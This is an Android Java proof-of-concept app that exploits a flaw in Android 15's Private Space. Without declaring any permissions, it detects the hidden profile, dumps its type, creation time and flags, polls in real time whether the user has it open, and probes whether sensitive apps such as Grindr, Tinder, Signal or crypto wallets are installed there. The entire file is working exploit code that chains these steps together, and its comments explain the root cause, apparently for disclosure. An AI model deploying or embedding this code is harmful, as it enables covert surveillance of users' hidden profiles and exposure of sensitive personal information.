package com.poc.privatespaceleak;

import android.app.Activity;
// UserInfo is @SystemApi, accessed via reflection
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Process;
import android.os.UserHandle;
import android.os.UserManager;
import android.util.Log;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.view.Gravity;

import java.lang.reflect.Method;
import java.util.List;

/**
 * V-344/V-345/V-346: Private Space Zero-Permission Detection Chain
 *
 * Android 15 introduced Private Space as a hidden profile (PROFILE_API_VISIBILITY_HIDDEN).
 * Internal APIs use getProfileIdsExcludingHidden() to respect this.
 * But the PUBLIC getProfileIds() and getProfiles() APIs pass excludeHidden=false,
 * leaking Private Space existence, metadata, and state to any zero-permission app.
 *
 * Root cause (UserManagerService.java):
 *   Line 1568: getProfileIds() → getProfileIds(userId, null, enabledOnly, false)
 *                                                                           ^^^^^ excludeHidden=false
 *   Line 1597: getProfilesLU() → getProfileIdsLU(userId, ..., false)
 *
 * Compare with secure variant (line 1666):
 *   getProfileIdsExcludingHidden() → getProfileIds(userId, null, enabledOnly, true)
 */
public class MainActivity extends Activity {

    private static final String TAG = "PrivateSpaceLeak";
    private static final String PRIVATE_SPACE_TYPE = "android.os.usertype.profile.private";

    private TextView mOutput;
    private StringBuilder mLog = new StringBuilder();
    private UserManager mUserManager;
    private int mPrivateSpaceUserId = -1;
    private Handler mHandler;
    private boolean mMonitoring = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mUserManager = getSystemService(UserManager.class);
        mHandler = new Handler(Looper.getMainLooper());

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(32, 48, 32, 32);

        TextView title = new TextView(this);
        title.setText("V-344/345/346: Private Space Detection");
        title.setTextSize(18);
        title.setGravity(Gravity.CENTER);
        root.addView(title);

        TextView info = new TextView(this);
        info.setText("ZERO permissions. Detects Private Space existence, "
                + "type, creation time, lock state, and monitors usage in real-time.");
        info.setTextSize(12);
        info.setPadding(0, 16, 0, 16);
        root.addView(info);

        Button btn1 = new Button(this);
        btn1.setText("1. Detect Private Space (getProfileIds)");
        btn1.setOnClickListener(v -> detectViaProfileIds());
        root.addView(btn1);

        Button btn2 = new Button(this);
        btn2.setText("2. Leak Metadata (getProfiles)");
        btn2.setOnClickListener(v -> leakMetadata());
        root.addView(btn2);

        Button btn3 = new Button(this);
        btn3.setText("3. Monitor State (isUserRunning/Unlocked)");
        btn3.setOnClickListener(v -> toggleMonitoring());
        root.addView(btn3);

        Button btn4 = new Button(this);
        btn4.setText("4. Full Chain (All Steps)");
        btn4.setOnClickListener(v -> fullChain());
        root.addView(btn4);

        ScrollView scroll = new ScrollView(this);
        mOutput = new TextView(this);
        mOutput.setTextSize(10);
        mOutput.setTypeface(android.graphics.Typeface.MONOSPACE);
        mOutput.setPadding(8, 8, 8, 8);
        scroll.addView(mOutput);
        root.addView(scroll, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1.0f));

        setContentView(root);

        log("=== Private Space Leak PoC (V-344/345/346) ===");
        log("Package: " + getPackageName());
        log("UID: " + Process.myUid());
        log("My userId: " + (Process.myUid() / 100000));
        log("Permissions: NONE declared");
        log("");
        log("Prerequisites: Private Space must be configured on device");
        log("(Settings > Security & privacy > Private Space)");
        log("");
    }

    private UserHandle userHandleOf(int userId) {
        try {
            Method of = UserHandle.class.getMethod("of", int.class);
            return (UserHandle) of.invoke(null, userId);
        } catch (Exception e) {
            return android.os.Process.myUserHandle();
        }
    }

    private int[] getProfileIdsWithDisabled(int userId) throws Exception {
        Method m = UserManager.class.getMethod("getProfileIdsWithDisabled", int.class);
        return (int[]) m.invoke(mUserManager, userId);
    }

    /**
     * V-344: getProfileIds returns Private Space userId without permission.
     * UserManagerService line 1568: excludeHidden=false for same-user query.
     */
    private void detectViaProfileIds() {
        log("\n--- V-344: DETECT PRIVATE SPACE ---");
        try {
            int myUserId = (Process.myUid() / 100000);

            int[] profileIds = getProfileIdsWithDisabled(myUserId);

            log("My userId: " + myUserId);
            log("Profile IDs returned: " + arrayToString(profileIds));
            log("Count: " + profileIds.length);

            if (profileIds.length > 1) {
                log("");
                log("[DETECTED] Multiple profiles found!");
                for (int id : profileIds) {
                    if (id != myUserId) {
                        log("  Unknown profile userId=" + id + " (potential Private Space)");
                        mPrivateSpaceUserId = id;
                    }
                }
                log("");
                log("*** V-344 CONFIRMED: Hidden profile ID leaked ***");
            } else {
                log("[INFO] Only 1 profile (self). Private Space may not be configured.");
            }
        } catch (SecurityException e) {
            log("[BLOCKED] " + e.getMessage());
        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    /**
     * V-345: getProfiles() returns UserInfo with userType, flags, creationTime.
     * UserManagerService line 1547-1563: same-user query skips permission check,
     * getProfilesLU passes excludeHidden=false.
     */
    private void leakMetadata() {
        log("\n--- V-345: LEAK PRIVATE SPACE METADATA ---");
        try {
            // Use reflection to call getProfiles which returns List<UserInfo>
            // The public API getProfiles() is @SystemApi but the underlying
            // IUserManager.getProfiles() is accessible via reflection
            Method getProfiles = UserManager.class.getMethod("getProfiles", int.class);
            @SuppressWarnings("unchecked")
            List<Object> profiles = (List<Object>) getProfiles.invoke(mUserManager,
                    (Process.myUid() / 100000));

            if (profiles == null || profiles.isEmpty()) {
                // Try alternative: getProfileIds + getUserInfo per ID
                log("getProfiles returned null/empty, trying per-ID approach...");
                tryPerIdApproach();
                return;
            }

            log("Profiles returned: " + profiles.size());
            for (Object profile : profiles) {
                dumpUserInfo(profile);
            }
        } catch (NoSuchMethodException e) {
            log("getProfiles not accessible, trying alternative approach...");
            tryPerIdApproach();
        } catch (SecurityException e) {
            log("[BLOCKED] " + e.getMessage());
        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
            tryPerIdApproach();
        }
    }

    private void tryPerIdApproach() {
        try {
            int[] ids = getProfileIdsWithDisabled((Process.myUid() / 100000));
            for (int id : ids) {
                if (id != (Process.myUid() / 100000)) {
                    log("\nProfile userId=" + id + ":");
                    // Try isUserRunning to confirm it exists
                    boolean running = mUserManager.isUserRunning(
                            userHandleOf(id));
                    log("  isUserRunning: " + running);

                    // Try getUserName via reflection
                    try {
                        Method isQuietModeEnabled = UserManager.class.getMethod(
                                "isQuietModeEnabled", UserHandle.class);
                        boolean quiet = (boolean) isQuietModeEnabled.invoke(
                                mUserManager, userHandleOf(id));
                        log("  isQuietModeEnabled: " + quiet + " (true = PS locked)");
                    } catch (Exception ex) {
                        log("  isQuietModeEnabled: " + ex.getMessage());
                    }

                    // Try to get user type via reflection
                    try {
                        Method getUserInfo = UserManager.class.getDeclaredMethod(
                                "getUserInfo", int.class);
                        getUserInfo.setAccessible(true);
                        Object ui = getUserInfo.invoke(mUserManager, id);
                        if (ui != null) {
                            dumpUserInfo(ui);
                        }
                    } catch (Exception ex) {
                        log("  getUserInfo: " + ex.getMessage());
                    }

                    mPrivateSpaceUserId = id;
                }
            }
        } catch (Exception e) {
            log("[ERROR] " + e.getMessage());
        }
    }

    private void dumpUserInfo(Object userInfo) {
        try {
            Class<?> cls = userInfo.getClass();
            int id = cls.getField("id").getInt(userInfo);
            String userType = (String) cls.getField("userType").get(userInfo);
            int flags = cls.getField("flags").getInt(userInfo);
            long creationTime = cls.getField("creationTime").getLong(userInfo);
            int serialNumber = cls.getField("serialNumber").getInt(userInfo);
            int profileGroupId = cls.getField("profileGroupId").getInt(userInfo);

            log("\n  UserInfo for userId=" + id + ":");
            log("    userType: " + userType);
            if (PRIVATE_SPACE_TYPE.equals(userType)) {
                log("    *** CONFIRMED: This is Private Space! ***");
            }
            log("    flags: 0x" + Integer.toHexString(flags));
            log("    creationTime: " + creationTime
                    + " (" + new java.util.Date(creationTime) + ")");
            log("    serialNumber: " + serialNumber);
            log("    profileGroupId: " + profileGroupId);

            // Decode flags
            if ((flags & 0x80) != 0) log("    → FLAG_QUIET_MODE (Private Space is LOCKED)");
            if ((flags & 0x1000) != 0) log("    → FLAG_PROFILE");

            if (PRIVATE_SPACE_TYPE.equals(userType)) {
                mPrivateSpaceUserId = id;
                log("\n*** V-345 CONFIRMED: Private Space metadata fully leaked ***");
                log("*** userType, flags, creationTime, serialNumber exposed ***");
            }
        } catch (Exception e) {
            log("  [dump error] " + e.getMessage());
        }
    }

    /**
     * V-346: isUserRunning/isUserUnlocked allow same-profile-group monitoring.
     * checkManageOrInteractPermissionIfCallerInOtherProfileGroup (line 2805)
     * returns without checking when caller is in same profile group as target.
     * Private Space IS in same profile group as parent user.
     */
    private void toggleMonitoring() {
        if (mPrivateSpaceUserId == -1) {
            log("\n[!] Run step 1 first to detect Private Space userId");
            return;
        }
        mMonitoring = !mMonitoring;
        if (mMonitoring) {
            log("\n--- V-346: MONITORING PRIVATE SPACE STATE ---");
            log("Polling isUserRunning/isUserUnlocked every 2 seconds...");
            log("Open/close Private Space to see state changes.\n");
            pollState();
        } else {
            log("\n[Monitoring stopped]");
        }
    }

    private void pollState() {
        if (!mMonitoring) return;
        try {
            UserHandle psHandle = userHandleOf(mPrivateSpaceUserId);
            boolean running = mUserManager.isUserRunning(psHandle);
            boolean unlocked = mUserManager.isUserUnlocked(psHandle);

            log("[POLL] PS(userId=" + mPrivateSpaceUserId + "): "
                    + "running=" + running + ", unlocked=" + unlocked
                    + " | " + new java.text.SimpleDateFormat("HH:mm:ss").format(
                    new java.util.Date()));

            if (running && unlocked) {
                log("  → User is ACTIVELY USING Private Space right now!");
            } else if (running && !unlocked) {
                log("  → Private Space starting up (not yet unlocked)");
            } else {
                log("  → Private Space is CLOSED/LOCKED");
            }
        } catch (SecurityException e) {
            log("[BLOCKED] " + e.getMessage());
            mMonitoring = false;
            return;
        } catch (Exception e) {
            log("[ERROR] " + e.getMessage());
        }
        mHandler.postDelayed(this::pollState, 2000);
    }

    private void fullChain() {
        log("\n========== FULL ATTACK CHAIN ==========\n");
        detectViaProfileIds();
        if (mPrivateSpaceUserId != -1) {
            leakMetadata();
            log("\n--- State Check ---");
            try {
                UserHandle psHandle = userHandleOf(mPrivateSpaceUserId);
                boolean running = mUserManager.isUserRunning(psHandle);
                boolean unlocked = mUserManager.isUserUnlocked(psHandle);
                log("Private Space (userId=" + mPrivateSpaceUserId + "):");
                log("  running=" + running + ", unlocked=" + unlocked);
            } catch (Exception e) {
                log("[ERROR] " + e.getMessage());
            }

            log("\n--- Deep Privacy Check: Enumerate PS Apps ---");
            tryEnumerateApps();

            log("\n*** FULL CHAIN CONFIRMED ***");
            log("Zero-permission app can:");
            log("  1. Detect Private Space existence");
            log("  2. Read running/unlocked state");
            log("  3. Monitor open/close/unlock in real-time");
        }
        log("\n========================================\n");
    }

    private void tryEnumerateApps() {
        try {
            UserHandle psHandle = userHandleOf(mPrivateSpaceUserId);

            // Method 1: LauncherApps.getActivityList
            android.content.pm.LauncherApps la = (android.content.pm.LauncherApps)
                    getSystemService("launcherapps");
            if (la != null) {
                try {
                    java.util.List<?> activities = la.getActivityList(null, psHandle);
                    if (activities != null && !activities.isEmpty()) {
                        log("[LEAK] LauncherApps returned " + activities.size()
                                + " apps in Private Space!");
                        for (int i = 0; i < Math.min(activities.size(), 10); i++) {
                            log("  " + activities.get(i));
                        }
                    } else {
                        log("[INFO] LauncherApps.getActivityList: empty/null");
                    }
                } catch (SecurityException e) {
                    log("[BLOCKED] LauncherApps: " + e.getMessage());
                }
            }

            // Method 2: PackageManager.getInstalledApplications via reflection
            try {
                Method getInstalledApps = getPackageManager().getClass().getMethod(
                        "getInstalledApplicationsAsUser", int.class, int.class);
                Object apps = getInstalledApps.invoke(getPackageManager(), 0, mPrivateSpaceUserId);
                if (apps != null) {
                    java.util.List<?> list = (java.util.List<?>) apps;
                    log("[LEAK] getInstalledApplicationsAsUser returned "
                            + list.size() + " apps!");
                }
            } catch (NoSuchMethodException e) {
                log("[INFO] getInstalledApplicationsAsUser not accessible");
            } catch (SecurityException e) {
                log("[BLOCKED] getInstalledApplicationsAsUser: " + e.getMessage());
            } catch (Exception e) {
                log("[INFO] PM method: " + e.getClass().getSimpleName()
                        + ": " + (e.getMessage() != null ?
                        e.getMessage().substring(0, Math.min(e.getMessage().length(), 60)) : ""));
            }

            // Method 3: Check if specific sensitive apps are installed in PS
            String[] sensitiveApps = {
                "com.android.chrome", "com.whatsapp", "org.thoughtcrime.securesms",
                "com.tinder", "com.grindr.android", "com.discord",
                "com.binance.dev", "com.coinbase.android"
            };
            log("\n--- Probing specific apps in Private Space ---");
            for (String pkg : sensitiveApps) {
                try {
                    // Try getPackageInfoAsUser via reflection
                    Method getInfoAsUser = getPackageManager().getClass().getMethod(
                            "getPackageInfoAsUser", String.class, int.class, int.class);
                    Object info = getInfoAsUser.invoke(getPackageManager(),
                            pkg, 0, mPrivateSpaceUserId);
                    if (info != null) {
                        log("[LEAK] " + pkg + " IS INSTALLED in Private Space!");
                    }
                } catch (java.lang.reflect.InvocationTargetException e) {
                    Throwable cause = e.getCause();
                    if (cause != null && cause.getClass().getSimpleName()
                            .contains("NameNotFoundException")) {
                        // Not installed — but we could still query without permission!
                        log("[QUERY OK] " + pkg + " → not installed (but query allowed!)");
                    } else if (cause instanceof SecurityException) {
                        log("[BLOCKED] " + pkg + " → " + cause.getMessage());
                        break;
                    } else {
                        log("[?] " + pkg + " → " + (cause != null ? cause.getMessage() : ""));
                    }
                } catch (NoSuchMethodException e) {
                    log("[INFO] getPackageInfoAsUser not accessible");
                    break;
                } catch (Exception e) {
                    log("[?] " + pkg + " → " + e.getClass().getSimpleName());
                    break;
                }
            }
        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private String arrayToString(int[] arr) {
        StringBuilder sb = new StringBuilder("[");
        for (int i = 0; i < arr.length; i++) {
            if (i > 0) sb.append(", ");
            sb.append(arr[i]);
        }
        return sb.append("]").toString();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        mLog.append(msg).append("\n");
        if (mOutput != null) {
            mOutput.setText(mLog.toString());
        }
    }
}
